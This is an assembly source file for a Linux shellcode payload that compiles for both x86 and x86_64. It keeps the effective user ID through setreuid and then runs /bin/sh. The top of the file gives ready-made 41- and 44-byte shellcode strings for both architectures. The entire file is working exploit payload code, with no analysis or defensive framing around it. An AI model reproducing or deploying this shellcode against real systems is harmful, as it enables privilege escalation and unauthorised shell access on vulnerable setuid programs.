# /* x86 & x64 - setreuid(geteuid() x 2); execve("/bin/sh", ["/bin/sh", 0], 0) */
# char shellcode32[41] = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x6a\x0b\x58\x99\x52\xeb\x08\x89\xe1\x5b\x88\x53\x07\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
# char shellcode64[44] = "\x6a\x6b\x58\x0f\x05\x48\x89\xc7\x48\x89\xc6\x6a\x71\x58\x0f\x05\x6a\x3b\x58\x99\x52\xeb\x09\x48\x89\xe6\x5f\x88\x57\x07\x0f\x05\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

# Register aliases to make it both x86 and x86_64 compatible #
.if ARCH == 64
	.set SYS_EXECVE,	59
	.set SYS_GETEUID,	107
	.set SYS_SETREUID,	113

	.set EAX,		%rax
	.set EBX,		%rdi
	.set ECX,		%rsi
	.set EDX,		%rdx
	.set ESP,		%rsp

	.macro _SYSCALL_
		syscall
	.endm
.else
	.set SYS_EXECVE,	11
	.set SYS_GETEUID,	49
	.set SYS_SETREUID,	70

	.set EAX,		%eax
	.set EBX,		%ebx
	.set ECX,		%ecx
	.set EDX,		%edx
	.set ESP,		%esp

	.macro _SYSCALL_
		int	$0x80
	.endm
.endif

.text
.globl _start
_start:
	push	$SYS_GETEUID	# sys_geteuid
	pop		EAX
	_SYSCALL_

	mov		EAX,		EBX	# 1st arg
	mov		EAX,		ECX	# 2nd arg
	push		$SYS_SETREUID		# sys_setreuid
	pop		EAX
	_SYSCALL_

	push		$SYS_EXECVE		# sys_execve
	pop		EAX
	cdq					# env = NULL

	push		EDX			# argv[1] = NULL
	jmp binsh
back:
	mov		ESP,		ECX	# argv
	pop		EBX			# argv[0] = address of '/bin/sh'
	movb		%dl,		7(EBX)	# null-terminator
	_SYSCALL_				# syscall

binsh:
	call back				# pushl next_instr; jmp back
	.ascii "/bin/sh"			# <-- next_instr
